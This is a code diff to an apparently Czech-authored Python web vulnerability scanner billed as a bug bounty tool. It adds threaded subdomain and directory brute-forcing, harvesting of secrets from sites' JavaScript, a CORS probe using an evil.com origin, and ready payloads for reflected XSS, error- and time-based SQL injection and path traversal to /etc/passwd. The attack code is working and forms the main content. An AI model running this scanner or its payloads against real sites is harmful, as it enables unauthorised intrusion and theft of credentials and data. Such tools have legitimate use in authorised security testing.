@@ -6,6 +6,7 @@ import random
 import argparse
 import socket
 import threading
+import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
@@ -22,14 +23,15 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
 ]
 # Rozšířený slovník pro subdomény
-SUBDOMAIN_WORDLIST = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog", "shop", "staging", "old", "new", "db", "cpanel", "webmail", "secure", "vpn", "portal"]
+SUBDOMAIN_WORDLIST = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog", "shop", "staging", "old", "new", "db", "cpanel", "webmail", "secure", "vpn", "portal", "autodiscover", "ns1", "ns2", "smtp", "pop3", "imap", "m", "mobile", "direct", "support", "billing", "client", "members"]
 # Payloady pro "tichý" sběr dat
 XSS_PAYLOAD = "<script>alert('XSS')</script>"
 SQLI_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; SELECT SLEEP(5)--"]
-LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../proc/version", "../../../../etc/hostname"]
+SQLI_TIME_PAYLOADS = ["'; SELECT SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "\") OR SLEEP(5)--"]
+LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../proc/version", "../../../../etc/hostname", "C:\\Windows\\win.ini"]
 OPEN_REDIRECT_PAYLOAD = "//evil.com"
 # Common directories for dirbusting
-COMMON_DIRS = ["/admin", "/login", "/dashboard", "/config", "/backup", "/.git", "/.env", "/phpinfo.php", "/server-status", "/wp-admin", "/adminer.php", "/phpmyadmin", "/test", "/dev", "/api", "/v1", "/v2"]
+COMMON_DIRS = ["/admin", "/login", "/dashboard", "/config", "/backup", "/.git", "/.env", "/phpinfo.php", "/server-status", "/wp-admin", "/adminer.php", "/phpmyadmin", "/test", "/dev", "/api", "/v1", "/v2", "/.git/config", "/.vscode", "/.ssh", "/backup.zip", "/config.php.bak", "/db.php.bak", "/.htaccess", "/robots.txt", "/sitemap.xml", "/assets", "/dist", "/build"]
 
 # --- GLOBÁLNÍ PROMĚNNÉ PRO UKLÁDÁNÍ ---
 HARVESTED_DATA = {
@@ -40,7 +42,10 @@ HARVESTED_DATA = {
     "emails": [],
     "interesting_files": [],
     "api_endpoints": [],
-    "vulnerabilities": []
+    "vulnerabilities": [],
+    "js_secrets": [],
+    "security_headers": {},
+    "cors_misconfig": False
 }
 console = Console()
 
@@ -59,23 +64,30 @@ def get_ip_address(url):
     except socket.gaierror:
         return "N/A"
 
-def enumerate_subdomains(domain, session):
+def enumerate_subdomains(domain, session, threads=10):
     found_subdomains = set()
     base_domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
     
+    def check_subdomain(word):
+        subdomain = f"https://{word}.{base_domain}"
+        try:
+            r = session.get(subdomain, headers=get_random_headers(), timeout=3, allow_redirects=True)
+            if r.status_code < 400:
+                console.print(f"[+] Found subdomain: [cyan]{subdomain}[/cyan] (Status: {r.status_code})")
+                return subdomain
+        except requests.RequestException:
+            pass
+        return None
+
     with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
         task = progress.add_task(f"[yellow]Enumerating subdomains for {base_domain}...", total=len(SUBDOMAIN_WORDLIST))
-        for word in SUBDOMAIN_WORDLIST:
-            subdomain = f"https://{word}.{base_domain}"
-            try:
-                r = session.get(subdomain, headers=get_random_headers(), timeout=3, allow_redirects=True)
-                if r.status_code < 400:
-                    found_subdomains.add(subdomain)
-                    console.print(f"[+] Found subdomain: [cyan]{subdomain}[/cyan] (Status: {r.status_code})")
-            except requests.RequestException:
-                pass
-            progress.advance(task)
-            delay_request()
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            future_to_word = {executor.submit(check_subdomain, word): word for word in SUBDOMAIN_WORDLIST}
+            for future in as_completed(future_to_word):
+                result = future.result()
+                if result:
+                    found_subdomains.add(result)
+                progress.advance(task)
     return list(found_subdomains)
 
 def discover_technologies(url, session):
@@ -127,6 +139,63 @@ def crawl_website(url, session, max_pages=50):
         except requests.RequestException:
             pass
     return list(found_urls)
+
+def analyze_javascript(url, session):
+    secrets = []
+    endpoints = set()
+    # Common regex for secrets
+    patterns = {
+        "API Key": r"(?:key|api_key|apikey|secret|token)[\s:=]+[\"']([a-zA-Z0-9_\-]{16,})[\"']",
+        "Firebase URL": r"https://[a-z0-9\-]+\.firebaseio\.com",
+        "Generic Secret": r"(?:secret|token|password|auth|creds)[\s:=]+[\"']([a-zA-Z0-9_\-\.]{10,})[\"']"
+    }
+    try:
+        r = session.get(url, headers=get_random_headers(), timeout=10)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        js_files = [urljoin(url, script['src']) for script in soup.find_all('script', src=True)]
+
+        for js_url in js_files:
+            try:
+                js_res = session.get(js_url, headers=get_random_headers(), timeout=10)
+                content = js_res.text
+
+                for name, pattern in patterns.items():
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    for match in matches:
+                        secrets.append({"type": name, "file": js_url, "value": match})
+
+                # Hidden endpoints
+                found_eps = re.findall(r"['\"](/[a-zA-Z0-9_\-/]+)['\"]", content)
+                for ep in found_eps:
+                    if len(ep) > 1:
+                        endpoints.add(ep)
+            except:
+                pass
+    except:
+        pass
+    return secrets, list(endpoints)
+
+def check_cors(url, session):
+    try:
+        headers = get_random_headers()
+        headers['Origin'] = 'https://evil.com'
+        r = session.get(url, headers=headers, timeout=10)
+        allow_origin = r.headers.get('Access-Control-Allow-Origin', '')
+        if allow_origin == '*' or allow_origin == 'https://evil.com':
+            return True
+    except:
+        pass
+    return False
+
+def check_security_headers(headers):
+    audit = {}
+    important = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy']
+    for header in important:
+        if header in headers:
+            audit[header] = headers[header]
+        else:
+            audit[header] = "MISSING"
+    return audit
 
 def extract_emails_and_files(url, session):
     emails = set()
@@ -192,24 +261,31 @@ def check_ssl_and_headers(url, session):
         pass
     return ssl_info, headers_info
 
-def dir_bust(url, session, wordlist):
+def dir_bust(url, session, wordlist, threads=10):
     exposed_dirs = []
+
+    def check_dir(word):
+        test_url = urljoin(url, word)
+        try:
+            r = session.get(test_url, headers=get_random_headers(), timeout=5)
+            if r.status_code == 200:
+                content = r.text.lower()
+                if not any(default in content for default in ["apache", "nginx", "iis", "404", "not found", "forbidden"]) or len(content) > 1000:
+                    console.print(f"[red]Exposed: [cyan]{test_url}[/cyan] (Status: {r.status_code}, Size: {len(content)})")
+                    return {"url": test_url, "status": r.status_code, "size": len(content)}
+        except requests.RequestException:
+            pass
+        return None
+
     with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
         task = progress.add_task(f"[yellow]Dirbusting {url}...", total=len(wordlist))
-        for word in wordlist:
-            test_url = urljoin(url, word)
-            try:
-                r = session.get(test_url, headers=get_random_headers(), timeout=5)
-                if r.status_code == 200:
-                    # Filter out default pages or redirects
-                    content = r.text.lower()
-                    if not any(default in content for default in ["apache", "nginx", "iis", "404", "not found", "forbidden"]) or len(content) > 1000:
-                        exposed_dirs.append({"url": test_url, "status": r.status_code, "size": len(content)})
-                        console.print(f"[red]Exposed: [cyan]{test_url}[/cyan] (Status: {r.status_code}, Size: {len(content)})")
-            except requests.RequestException:
-                pass
-            progress.advance(task)
-            delay_request()
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(check_dir, word) for word in wordlist]
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    exposed_dirs.append(result)
+                progress.advance(task)
     return exposed_dirs
 
 # --- FÁZE 2: SKENOVÁNÍ A ÚTOK ---
@@ -233,15 +309,41 @@ def scan_and_exploit(url, session):
             if XSS_PAYLOAD in res.text:
                 vulnerabilities.append({"type": "XSS", "url": form_url, "payload": XSS_PAYLOAD, "method": method, "details": "Reflected XSS found in form."})
                 delay_request()
-                continue # Na jednom formuláři stačí najít jednu věc
+                continue
 
-            # SQLi Test
+            # SQLi Test (Error-based)
             for payload in SQLI_PAYLOADS:
                 test_data = {k: payload for k in inputs.keys()}
                 try:
                     res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
                     if any(error in res.text.lower() for error in ["sql", "mysql", "syntax", "database"]):
-                        vulnerabilities.append({"type": "SQLi", "url": form_url, "payload": payload, "method": method, "details": "Possible SQL injection vulnerability."})
+                        vulnerabilities.append({"type": "SQLi (Error)", "url": form_url, "payload": payload, "method": method, "details": "Possible SQL injection vulnerability."})
+                        break
+                except:
+                    pass
+                delay_request()
+
+            # SQLi Test (Time-based)
+            for payload in SQLI_TIME_PAYLOADS:
+                test_data = {k: payload for k in inputs.keys()}
+                try:
+                    start_time = time.time()
+                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=15) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=15)
+                    duration = time.time() - start_time
+                    if duration >= 5:
+                        vulnerabilities.append({"type": "SQLi (Time)", "url": form_url, "payload": payload, "method": method, "details": f"Possible Blind SQLi (Duration: {duration:.2f}s)"})
+                        break
+                except:
+                    pass
+                delay_request()
+
+            # LFI Test
+            for payload in LFI_PAYLOADS:
+                test_data = {k: payload for k in inputs.keys()}
+                try:
+                    res = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10) if method == 'post' else session.get(form_url, params=test_data, headers=get_random_headers(), timeout=10)
+                    if any(indicator in res.text for indicator in ["root:x:0:0", "bin:x:1:1", "[extensions]", "boot loader"]):
+                        vulnerabilities.append({"type": "LFI", "url": form_url, "payload": payload, "method": method, "details": "Local File Inclusion found."})
                         break
                 except:
                     pass
@@ -261,14 +363,24 @@ def scan_and_exploit(url, session):
         print(f"Error during scan: {e}")
     return vulnerabilities
 
-def run_scan(target_url):
+def save_report(data, filepath):
+    try:
+        with open(filepath, "w") as f:
+            json.dump(data, f, indent=4)
+        console.print(f"\n[bold green]Results saved to {filepath}[/bold green]")
+    except Exception as e:
+        console.print(f"[red]Error saving report: {e}[/red]")
+
+def run_scan(target_url, threads=10, proxy=None, output_file=None):
     session = requests.Session()
+    if proxy:
+        session.proxies = {"http": proxy, "https": proxy}
 
     # Phase 1: Reconnaissance
     console.print("[bold green]Phase 1: Reconnaissance[/bold green]")
     HARVESTED_DATA["target"] = target_url
     HARVESTED_DATA["ip_address"] = get_ip_address(target_url)
-    HARVESTED_DATA["subdomains"] = enumerate_subdomains(target_url, session)
+    HARVESTED_DATA["subdomains"] = enumerate_subdomains(target_url, session, threads=threads)
     HARVESTED_DATA["technologies"] = discover_technologies(target_url, session)
     emails, files, apis = extract_emails_and_files(target_url, session)
     HARVESTED_DATA["emails"] = emails
@@ -278,10 +390,17 @@ def run_scan(target_url):
     robots, sitemap = check_robots_and_sitemap(target_url, session)
     HARVESTED_DATA["robots_txt"] = robots
     HARVESTED_DATA["sitemap_xml"] = sitemap
-    HARVESTED_DATA["exposed_dirs"] = dir_bust(target_url, session, COMMON_DIRS)
+    HARVESTED_DATA["exposed_dirs"] = dir_bust(target_url, session, COMMON_DIRS, threads=threads)
     ssl_info, headers_info = check_ssl_and_headers(target_url, session)
     HARVESTED_DATA["ssl_info"] = ssl_info
     HARVESTED_DATA["headers"] = headers_info
+
+    # Advanced Reco
+    js_secrets, js_endpoints = analyze_javascript(target_url, session)
+    HARVESTED_DATA["js_secrets"] = js_secrets
+    HARVESTED_DATA["api_endpoints"].extend(js_endpoints)
+    HARVESTED_DATA["security_headers"] = check_security_headers(headers_info)
+    HARVESTED_DATA["cors_misconfig"] = check_cors(target_url, session)
 
     # Phase 2: Scanning and Exploitation
     console.print("[bold red]Phase 2: Scanning and Exploitation[/bold red]")
@@ -292,6 +411,10 @@ def run_scan(target_url):
     for page in HARVESTED_DATA["all_urls"][:5]:
         all_vulns.extend(scan_and_exploit(page, session))
     HARVESTED_DATA["vulnerabilities"] = all_vulns
+
+    # Save report if requested
+    if output_file:
+        save_report(HARVESTED_DATA, output_file)
 
     # Display results in organized sections
     console.print("\n[bold blue]=== SCAN RESULTS ===[/bold blue]")
@@ -349,6 +472,25 @@ def run_scan(target_url):
         panel = Panel(sitemap[:500] + "..." if len(sitemap) > 500 else sitemap, title="Sitemap.xml", border_style="magenta")
         console.print(panel)
 
+    # JS Secrets
+    js_secrets = HARVESTED_DATA.get("js_secrets", [])
+    if js_secrets:
+        sec_list = "\n".join(f"- {s['type']} in {s['file']}" for s in js_secrets)
+        panel = Panel(sec_list, title="JS Secrets Found", border_style="bold red")
+        console.print(panel)
+
+    # Security Headers
+    sec_headers = HARVESTED_DATA.get("security_headers", {})
+    if sec_headers:
+        header_audit = "\n".join(f"{k}: {v}" for k, v in sec_headers.items())
+        panel = Panel(header_audit, title="Security Headers Audit", border_style="yellow")
+        console.print(panel)
+
+    # CORS
+    if HARVESTED_DATA.get("cors_misconfig"):
+        panel = Panel("CORS Misconfiguration: Access-Control-Allow-Origin allows evil.com or *", title="CORS Audit", border_style="red", style="bold red")
+        console.print(panel)
+
     # Headers
     headers = HARVESTED_DATA.get("headers", {})
     if headers:
@@ -375,4 +517,15 @@ def interactive_menu():
             console.print("[red]Invalid choice. Try again.[/red]")
 
 if __name__ == "__main__":
-    interactive_menu()
+    parser = argparse.ArgumentParser(description="Bug Bounty Penetration Testing Tool")
+    parser.add_argument("-t", "--target", help="Target URL (e.g., https://example.com)")
+    parser.add_argument("-w", "--threads", type=int, default=10, help="Number of threads (default: 10)")
+    parser.add_argument("-o", "--output", help="Output JSON file path")
+    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
+
+    args = parser.parse_all() if hasattr(argparse.ArgumentParser, 'parse_all') else parser.parse_args()
+
+    if args.target:
+        run_scan(args.target, threads=args.threads, proxy=args.proxy, output_file=args.output)
+    else:
+        interactive_menu()
